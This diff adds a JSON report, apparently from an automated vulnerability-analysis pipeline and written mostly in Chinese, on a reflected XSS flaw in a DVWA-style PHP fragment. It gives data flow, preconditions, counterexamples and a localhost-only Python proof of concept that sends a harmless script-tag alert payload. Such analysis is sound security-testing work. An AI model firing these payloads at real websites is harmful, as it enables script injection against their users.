@@ -1,0 +1,104 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "XSS-001",
+  "input_version": "v2",
+  "prompt_version": "v1",
+  "analysis_stage": "parent",
+  "received_packet_ids": ["XSS-001"],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "medium",
+    "reason": "片段内输入来源（$_GET['name']，第4行）、危险汇聚点（字符串拼接进入$html，第6行）与最终输出关系明确，且未见任何转义或白名单处理；但外围dvwaHtmlEcho实现、$html插入page['body']的方式、PHP/浏览器版本与登录会话均未提供，无法静态确认最终响应中标签未被二次编码，也无法确认实际可达的URL与参数状态，故为中等置信度的待验证候选。"
+  },
+  "findings": [
+    {
+      "finding_id": "XSS-001-F1",
+      "vulnerability_type": "反射型跨站脚本（XSS）",
+      "locations": [
+        {
+          "fragment_id": "XSS-001",
+          "line_start": 4,
+          "line_end": 4,
+          "quote": "if( array_key_exists( \"name\", $_GET ) && $_GET[ 'name' ] != NULL ) {"
+        },
+        {
+          "fragment_id": "XSS-001",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "$html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';"
+        }
+      ],
+      "data_flow": [
+        "第4行：array_key_exists(\"name\", $_GET) 与 $_GET['name'] != NULL 判断请求中是否存在非空 name 参数，仅做存在性判断，不做字符校验。",
+        "第6行：$_GET['name'] 未经 htmlspecialchars/htmlentities/strip_tags 等任何编码或过滤，直接以 . 拼接进 $html 的 <pre>Hello ... </pre> 字符串。",
+        "外围处理器（context/中，未提供）把 $html 整体插入 page['body']。",
+        "页面渲染调用 dvwaHtmlEcho 输出 page['body']（实现未提供），响应回显给请求者。",
+        "观察点：响应体中 <pre>Hello 之后的内容是否以原始 < > \" 字符出现，以及浏览器是否将其解析为元素/脚本。"
+      ],
+      "principle": "服务端把 GET 参数 name 原样拼接到 HTML 片段中并回显，未做上下文相关的 HTML 实体编码。攻击者可让受害者的浏览器请求带有 <script> 或事件属性载荷的 URL，响应中的载荷被浏览器当作标记解析，从而在以靶场站点为源的上下文中执行脚本。片段第2行 header(\"X-XSS-Protection: 0\") 显式关闭旧版浏览器的反射型 XSS 过滤器，进一步降低浏览器侧兜底拦截的可能（现代浏览器已不依赖该头）。",
+      "impact": "在受害者会话上下文中执行任意前端脚本（教学场景仅使用无害标记）：可读取页面 DOM、以受害者身份发起同源请求、篡改页面内容。由于是反射型且需诱导点击构造 URL，利用需要交互；若外围存在会话 Cookie 且未设置 HttpOnly，则存在会话数据被脚本读取的理论路径（本次不验证、不读取 Cookie）。",
+      "preconditions": [
+        "外围处理器确实将本片段包含进可访问页面，并存在可实际请求的 URL 路径。",
+        "dvwaHtmlEcho/页面渲染不对 page['body'] 再做 HTML 实体编码或标签清洗。",
+        "请求参数名恰为 name，且值为非空字符串（第4行条件），PHP 对数组形式 name[]=x 的处理未在本片段约束。",
+        "受害者被诱导访问带有载荷的链接，浏览器在响应上下文中解析并执行该标记。",
+        "认证/难度配置允许未登录或已登录用户访问该页面（取决于外围逻辑，未提供）。"
+      ],
+      "counterexamples": [
+        "若 dvwaHtmlEcho 或 page['body'] 组装阶段对内容执行 htmlspecialchars（ENT_QUOTES）后再输出，则 < > 被编码为实体，脚本不会执行，本候选不成立。",
+        "若外围在包含本片段前对 $_GET['name'] 做了统一过滤/白名单（如仅允许字母数字），则注入字符不可达。",
+        "若该片段所在页面被 CSP 以 script-src 'self' 等策略限制且无内联放行，内联 <script> 载荷会被浏览器拒绝（事件属性载荷同样受 CSP 约束）。",
+        "若页面实际不可达（片段仅被死代码包含）或参数被外围重写，则无可利用路径。",
+        "若 name 参数在外围被强制转换为数组或整型，第4行条件与拼接行为将改变，需重新评估。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n\"\"\"XSS-001 本地授权靶场反射型 XSS 最小验证草案（未运行）。\n仅允许 localhost/127.0.0.1/::1，不跟随重定向，不使用真实口令。\n用法示例：python xss001_poc.py --base-url http://127.0.0.1 --path /vulnerabilities/xss_r/\n\"\"\"\nimport argparse\nimport http.client\nimport sys\nfrom urllib.parse import urlencode, urlsplit\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\nPAYLOAD = \"<script>alert('XSS001')</script>\"\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"XSS-001 反射型 XSS 验证草案\")\n    parser.add_argument(\"--base-url\", default=\"http://127.0.0.1\", help=\"靶场基址，仅允许本地主机\")\n    parser.add_argument(\"--path\", required=True, help=\"本片段所在页面的路径，需人工确认\")\n    parser.add_argument(\"--timeout\", type=float, default=5.0, help=\"请求超时秒数\")\n    parser.add_argument(\"--cookie\", default=None, help=\"可选会话 Cookie，不入库、不打印\")\n    args = parser.parse_args()\n\n    parts = urlsplit(args.base_url)\n    if parts.scheme not in (\"http\", \"https\") or parts.hostname not in ALLOWED_HOSTS:\n        print(\"[FAIL] 仅允许 http(s) 且主机为 localhost/127.0.0.1/::1\", file=sys.stderr)\n        return 2\n\n    target = args.path + \"?\" + urlencode({\"name\": PAYLOAD})\n    headers = {\"Accept\": \"text/html\"}\n    if args.cookie:\n        headers[\"Cookie\"] = args.cookie\n\n    conn_cls = http.client.HTTPSConnection if parts.scheme == \"https\" else http.client.HTTPConnection\n    conn = conn_cls(parts.hostname, parts.port, timeout=args.timeout)\n    try:\n        conn.request(\"GET\", target, headers=headers)\n        resp = conn.getresponse()\n        body = resp.read().decode(\"utf-8\", \"replace\")\n    except OSError as exc:\n        print(f\"[ERROR] 连接失败或超时: {exc}\", file=sys.stderr)\n        return 3\n    finally:\n        conn.close()\n\n    print(f\"[INFO] HTTP {resp.status}，响应长度 {len(body)}\")\n    if resp.status in (301, 302, 303, 307, 308):\n        print(\"[WARN] 收到重定向，脚本未跟随；请人工确认登录状态与目标路径\", file=sys.stderr)\n        return 4\n    if PAYLOAD in body:\n        print(\"[OBSERVE] 原始 payload 未经编码出现在响应中\")\n        print(\"[NEXT] 需在浏览器中打开同一 URL，确认 alert('XSS001') 标记弹出\")\n        return 0\n    if \"&lt;script&gt;\" in body or \"&#60;script&#62;\" in body:\n        print(\"[OBSERVE] payload 以 HTML 实体形式出现，静态上未见可利用反射\")\n        return 0\n    print(\"[OBSERVE] 响应中未定位 payload，需人工核对路径、参数名与登录状态\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": ["Python 3.8+（仅标准库：argparse、http.client、urllib.parse、sys）", "可访问的本地授权靶场实例（localhost/127.0.0.1/::1）"],
+        "parameters": ["--base-url 靶场基址，默认 http://127.0.0.1，仅接受本地主机", "--path 本片段所在页面的实际路径，需人工确认（未提供）", "--timeout 请求超时，默认 5 秒", "--cookie 可选会话 Cookie，由命令行提供，不写入版本库、不打印"],
+        "steps": [
+          "确认外围源码中本片段被哪个 URL 路径包含，并确认访问所需认证状态与难度配置。",
+          "在本地授权靶场启动服务，记录源提交、PHP 版本、浏览器与操作系统。",
+          "运行脚本，仅改变 name 参数为无害脚本标记，其余请求头与正常访问保持一致。",
+          "核对响应中 <pre>Hello 之后的内容是否为原始标签，而非 HTML 实体。",
+          "在浏览器打开同一 URL，观察是否弹出 alert('XSS001')；同时用 name=<b>XSS001</b> 做对照，确认标签被解析。",
+          "如页面为已登录状态，记录所需会话来源；验证结束后恢复测试数据，不读取或外传 Cookie。"
+        ],
+        "expected_observation": "响应 HTML 中出现未经编码的 <pre>Hello <script>alert('XSS001')</script></pre>，且浏览器加载该 URL 时执行脚本并弹出 XSS001 标记；对照载荷 name=<b>XSS001</b> 时 XSS001 以粗体呈现，说明标签被解析。",
+        "success_criteria": "在浏览器中实际观察到脚本执行（alert 弹出），且响应体同一位置出现未编码的原始载荷；同时满足对照请求中 <b> 被解析、而使用 htmlspecialchars 的对照路径不解析。仅 HTTP 200 或响应中出现输入字符串本身不构成确认。",
+        "limitations": "本草案未运行；--path 与实际 URL 未知，需人工适配；未包含登录流程与 token 处理；仅验证反射与标记解析，不读取 Cookie、不外传数据；片段不能独立部署，结论依赖外围 dvwaHtmlEcho 的实现。",
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "外围请求处理器源码（context/ 目录内容未提供）：$html 如何被包含、page['body'] 如何组装、是否存在二次编码。",
+    "dvwaPage.inc.php 中 dvwaHtmlEcho 的实现：是否对输出执行 htmlspecialchars 或其它编码。",
+    "本片段实际可访问的 URL 路径、所属模块与包含条件。",
+    "认证与难度配置：是否需要登录、低/中/高难度下是否启用不同过滤分支。",
+    "PHP 版本、Web 服务器、浏览器与操作系统版本，影响标签解析与 X-XSS-Protection 的实际作用。",
+    "是否存在会话 token、CSP 响应头或其它安全响应头。"
+  ],
+  "risk_notes": [
+    "第2行 header(\"X-XSS-Protection: 0\") 主动关闭旧版浏览器的反射型 XSS 过滤器，属防御弱化配置，影响范围可能不止本片段。",
+    "若同一 $html 变量在其它分支复用并输出，可能存在存储型或其它反射点，需在完整源码中排查。",
+    "若站点未设置 HttpOnly 与 SameSite，XSS 一旦成立可扩大至会话相关风险（本次不测试、不读取 Cookie）。"
+  ],
+  "quality_notes": [
+    "第4行使用 != NULL 松散比较，语义不精确，应使用 !== null 或 isset()。",
+    "第1—2行在片段中直接输出 header()，片段不能独立部署，头部设置与页面渲染顺序耦合。",
+    "X-XSS-Protection 为已被主流浏览器弃用的过时安全头，不应作为防护手段。",
+    "输出拼接缺少统一编码函数封装，后续维护容易在其他分支遗漏转义。"
+  ],
+  "limitations": [
+    "仅对提供的 8 行标准化片段做静态分析，未查看外围源码、dvwaPage.inc.php 与运行配置。",
+    "所有结论基于第4行输入判断与第6行字符串拼接的可见代码，未执行任何请求或浏览器验证。",
+    "未能确认最终响应中 payload 是否被外围编码，故判定为待验证而非确认。",
+    "排除性结论不外推至整个项目；本样本仅覆盖 name 参数这一条反射路径。"
+  ],
+  "runtime_evidence": []
+}
